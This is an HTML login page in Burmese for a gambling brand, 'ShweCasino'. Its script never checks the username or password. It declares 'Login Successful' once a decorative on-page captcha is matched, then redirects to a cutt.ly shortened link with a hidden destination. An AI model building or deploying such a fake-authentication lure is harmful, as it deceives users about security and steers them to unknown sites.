<!DOCTYPE html>
<html lang="my">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ShweCasino Login</title>

<style>

body{
margin:0;
font-family:Myanmar Text;
background:#8b0000;
color:white;
}

/* banner */

.banner img{
width:100%;
height:220px;
object-fit:cover;
display:block;
}

/* container */

.container{
padding:15px;
}

/* login box */

.login-box{
background:#6b0000;
padding:20px;
border-radius:12px;
}

/* title */

h2{
text-align:center;
margin-top:0;
}

/* input */

input{
width:100%;
padding:12px;
margin-top:12px;
border:none;
border-radius:6px;
background:#a40000;
color:white;
font-size:16px;
}

/* password box */

.pass-box{
position:relative;
}

.eye{
position:absolute;
right:10px;
top:18px;
cursor:pointer;
}

/* captcha */

.captcha-box{
display:flex;
justify-content:space-between;
align-items:center;
background:#e7c892;
color:black;
padding:10px;
margin-top:12px;
border-radius:6px;
font-size:22px;
letter-spacing:5px;
}

/* button */

button{
width:100%;
padding:14px;
margin-top:15px;
background:#e0b96c;
border:none;
border-radius:8px;
font-size:18px;
cursor:pointer;
}

/* bottom */

.bottom{
display:flex;
justify-content:space-between;
margin-top:12px;
font-size:14px;
}

</style>
</head>

<body>

<!-- Banner -->

<div class="banner">
<img src="https://images.unsplash.com/photo-1596838132731-3301c3fd4317">
</div>

<div class="container">

<div class="login-box">

<h2>အကောင့်ဝင်ရန်</h2>

<input id="username" placeholder="အသုံးပြုသူအမည်">

<div class="pass-box">
<input id="password" type="password" placeholder="စကားဝှက်">
<span class="eye" onclick="togglePass()">👁</span>
</div>

<div class="captcha-box">
<span id="captcha"></span>
<span onclick="generateCaptcha()" style="cursor:pointer;">↻</span>
</div>

<input id="captchaInput" placeholder="အပေါ်ကဂဏန်းထည့်ပါ">

<button onclick="login()">အကောင့်ဝင်ရန်</button>

<div class="bottom">
<span>အကောင့်အသစ်ဖွင့်ရန်</span>
<span>စကားဝှက်မေ့နေပါသလား?</span>
</div>

</div>

</div>

<script>

var code="";

/* captcha */

function generateCaptcha(){
code="";
for(let i=0;i<5;i++){
code+=Math.floor(Math.random()*10);
}
document.getElementById("captcha").innerText=code;
}

generateCaptcha();

/* show password */

function togglePass(){
var p=document.getElementById("password");

if(p.type==="password"){
p.type="text";
}else{
p.type="password";
}

}

/* login */

function login(){

var cap=document.getElementById("captchaInput").value;

if(cap!==code){
alert("Captcha မှားနေသည်");
generateCaptcha();
return;
}

/* success */

alert("Login Successful");

/* redirect link */

window.location.href="https://cutt.ly/Ztvz2YWb";

}

</script>

</body>
</html>
